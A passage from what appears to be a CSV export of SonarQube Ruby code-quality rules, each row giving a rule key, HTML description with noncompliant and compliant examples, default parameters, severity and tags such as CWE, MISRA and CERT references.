that do not parse but also to easily find out why they do not parse.</p>",Ruby parser failure,[],MAJOR,['suspicious'],CODE_SMELL
2018-09-05T14:35:18+0200,<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>,ruby:S100,ruby,Ruby,<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>,Method names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the function names against.', 'defaultValue': '^(@{0,2}[\\da-z_]+[!?=]?)|([*+-/%=!><~]+)|(\\[]=?)$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
  ...
end
</pre>",ruby:S101,ruby,Ruby,"<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
  ...
end
</pre>",Class names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the class names against.', 'defaultValue': '^[A-Z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,ruby:S103,ruby,Ruby,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length.', 'defaultValue': '200', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",ruby:S104,ruby,Ruby,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'Max', 'htmlDesc': 'Maximum authorized lines of code in a file.', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",ruby:S105,ruby,Ruby,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",Tabulation characters should not be used,[],MINOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if ((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()
  ...
end
</pre>",ruby:S1067,ruby,Ruby,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if ((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()
  ...
end
</pre>",Expressions should not be too complex,"[{'key': 'max', 'htmlDesc': 'Maximum number of allowed conditional operators in an expression', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>",ruby:S107,ruby,Ruby,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>",Functions should not have too many parameters,"[{'key': 'Max', 'htmlDesc': 'Maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0 # Noncompliant; empty on purpose or missing piece of code?
  end
  puts ""Result: #{sum}""
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0
    puts ""Positive result""
  end
  puts ""Result: #{sum}""
end
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>
<p><code>while</code> and <code>unless</code> loops are also exception to the rule.</p>
<pre>
while @order.process_next; end # Compliant
</pre>",ruby:S108,ruby,Ruby,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0 # Noncompliant; empty on purpose or missing piece of code?
  end
  puts ""Result: #{sum}""
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def compute(a, b)
  sum = a + b
  if  sum &gt; 0
    puts ""Positive result""
  end
  puts ""Result: #{sum}""
end
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>
<p><code>while</code> and <code>unless</code> loops are also exception to the rule.</p>
<pre>
while @order.process_next; end # Compliant
</pre>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
x = (y / 2 + 1)  # Compliant even if the parenthesis are ignored by the compiler

if a &amp;&amp; ((x+y &gt; 0))  # Noncompliant
  # ...
end

return ((x + 1)) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
x = (y / 2 + 1)

if a &amp;&amp; (x+y &gt; 0)
  # ...
end

return (x + 1)
</pre>",ruby:S1110,ruby,Ruby,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
x = (y / 2 + 1)  # Compliant even if the parenthesis are ignored by the compiler

if a &amp;&amp; ((x+y &gt; 0))  # Noncompliant
  # ...
end

return ((x + 1)) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
x = (y / 2 + 1)

if a &amp;&amp; (x+y &gt; 0)
  # ...
end

return (x + 1)
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator)
  return numerator / denominator             # FIXME denominator value might be 0
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",ruby:S1134,ruby,Ruby,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator)
  return numerator / denominator             # FIXME denominator value might be 0
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def do_something()
   # TODO
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",ruby:S1135,ruby,Ruby,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def do_something()
   # TODO
end
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if true
  doSomething()
end
...
if false
  doSomethingElse()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>",ruby:S1145,ruby,Ruby,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if true
  doSomething()
end
...
if false
  doSomethingElse()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>","Useless ""if true ..."" and ""if false ..."" blocks should be removed",[],MAJOR,"['cwe', 'misra']",BUG
2018-09-05T14:35:18+0200,"<p>The <code>case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>when</code> clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the threshold set at 5:</p>
<pre>
case myVariable
when 0 then # Noncompliant: 6 lines till next ""when""
    methodCall1("""")
    methodCall2("""")
    methodCall3("""")
    methodCall4("""")
    methodCall5("""")
    methodCall6("""")
when 1
   # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case myVariable
when 0 then
  doSomething()
when 1
   # ...
end
...
def doSomething()
    methodCall1("""")
    methodCall2("""")
    methodCall3("""")
    methodCall4("""")
    methodCall5("""")
    methodCall6("""")
end
</pre>",ruby:S1151,ruby,Ruby,"<p>The <code>case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>when</code> clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the threshold set at 5:</p>
<pre>
case myVariable
when 0 then # Noncompliant: 6 lines till next ""when""
    methodCall1("""")
    methodCall2("""")
    methodCall3("""")
    methodCall4("""")
    methodCall5("""")
    methodCall6("""")
when 1
   # ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case myVariable
when 0 then
  doSomething()
when 1
   # ...
end
...
def doSomething()
    methodCall1("""")
    methodCall2("""")
    methodCall3("""")
    methodCall4("""")
    methodCall5("""")
    methodCall6("""")
end
</pre>","""case when"" clauses should not have too many lines of code","[{'key': 'max', 'htmlDesc': 'Maximum number of lines', 'defaultValue': '15', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a function or block parameter name does not match
the provided regular expression.</p>",ruby:S117,ruby,Ruby,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a function or block parameter name does not match
the provided regular expression.</p>",function and block parameter names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the names against.', 'defaultValue': '^(@{0,2}[\\da-z_]+[!?=]?)|([*+-/%=!><~]+)|(\\[]=?)$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",ruby:S1172,ruby,Ruby,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused function parameters should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>",ruby:S1186,ruby,Ruby,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>",Methods should not be empty,[],CRITICAL,['suspicious'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>",ruby:S1192,ruby,Ruby,"<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>",String literals should not be duplicated,"[{'key': 'threshold', 'htmlDesc': 'Number of times a literal must be duplicated to trigger an issue', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['design'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if someCondition; puts ""hello""; end
</pre>
<h2>Compliant Solution</h2>
<pre>
if someCondition
  puts ""hello""
end
</pre>",ruby:S122,ruby,Ruby,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if someCondition; puts ""hello""; end
</pre>
<h2>Compliant Solution</h2>
<pre>
if someCondition
  puts ""hello""
end
</pre>",Statements should be on separate lines,[],MAJOR,['style'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>elsif</code> statements; the final <code>elsif</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>else</code> clause in a <code>case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
else
  raise 'An error has occured'
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",ruby:S126,ruby,Ruby,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>elsif</code> statements; the final <code>elsif</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>else</code> clause in a <code>case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
else
  raise 'An error has occured'
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""if ... else if"" constructs should end with ""else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>The requirement for a final <code>else</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
  else
    handle_error('error_message')
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>",ruby:S131,ruby,Ruby,"<p>The requirement for a final <code>else</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
  else
    handle_error('error_message')
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>","""case"" statements should have ""else"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
my_number = 023 # Noncompliant. my_number will hold 19, not 23 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
my_number = 23
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to values smaller than 8 and octal values having 3 digits, since 3 digits octal values are often used as file permission
masks.</p>
<p>Example:</p>
<pre>
permission_mask = 0777
day_of_month = 03
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",ruby:S1314,ruby,Ruby,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
my_number = 023 # Noncompliant. my_number will hold 19, not 23 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
my_number = 23
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to values smaller than 8 and octal values having 3 digits, since 3 digits octal values are often used as file permission
masks.</p>
<p>Example:</p>
<pre>
permission_mask = 0777
day_of_month = 03
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",Octal values should not be used,[],BLOCKER,"['cert', 'misra', 'pitfall']",CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>until</code>, <code>case</code> and <code>begin...rescue</code> statements are
key ingredients for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>",ruby:S134,ruby,Ruby,"<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>until</code>, <code>case</code> and <code>begin...rescue</code> statements are
key ingredients for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>","Control flow statements ""if"", ""for"", ""while"", ""until"", ""case"" and ""begin...rescue"" should not be nested too deeply","[{'key': 'max', 'htmlDesc': 'Maximum allowed control flow statement nesting depth', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>",ruby:S138,ruby,Ruby,"<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>",Functions should not have too many lines of code,"[{'key': 'max', 'htmlDesc': 'Maximum authorized lines of code in a function', 'defaultValue': '100', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
#
# SonarQube, open source software quality management tool.
# Copyright (C) 2008-2018 SonarSource
# mailto:contact AT sonarsource DOT com
#
# SonarQube is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 3 of the License, or (at your option) any later version.
#
# SonarQube is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with this program; if not, write to the Free Software Foundation,
# Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
</pre>",ruby:S1451,ruby,Ruby,"<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
#
# SonarQube, open source software quality management tool.
# Copyright (C) 2008-2018 SonarSource
# mailto:contact AT sonarsource DOT com
#
# SonarQube is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 3 of the License, or (at your option) any later version.
#
# SonarQube is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with this program; if not, write to the Free Software Foundation,
# Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
</pre>",Track lack of copyright and license headers,"[{'key': 'headerFormat', 'htmlDesc': 'Expected copyright and license header', 'type': 'TEXT'}, {'key': 'isRegularExpression', 'htmlDesc': 'Whether the headerFormat is a regular expression', 'defaultValue': 'false', 'type': 'BOOLEAN'}]",BLOCKER,[],CODE_SMELL
2018-09-05T14:35:18+0200,"<p>When <code>case</code> statements have a large number of clauses, it is usually an attempt to map two sets of data. A real <code>Hash</code>
structure would be more readable and maintainable, and should be used instead.</p>",ruby:S1479,ruby,Ruby,"<p>When <code>case</code> statements have a large number of clauses, it is usually an attempt to map two sets of data. A real <code>Hash</code>
structure would be more readable and maintainable, and should be used instead.</p>","""case"" statements should not have too many ""when"" clauses","[{'key': 'maximum', 'htmlDesc': 'Maximum number of branches', 'defaultValue': '30', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
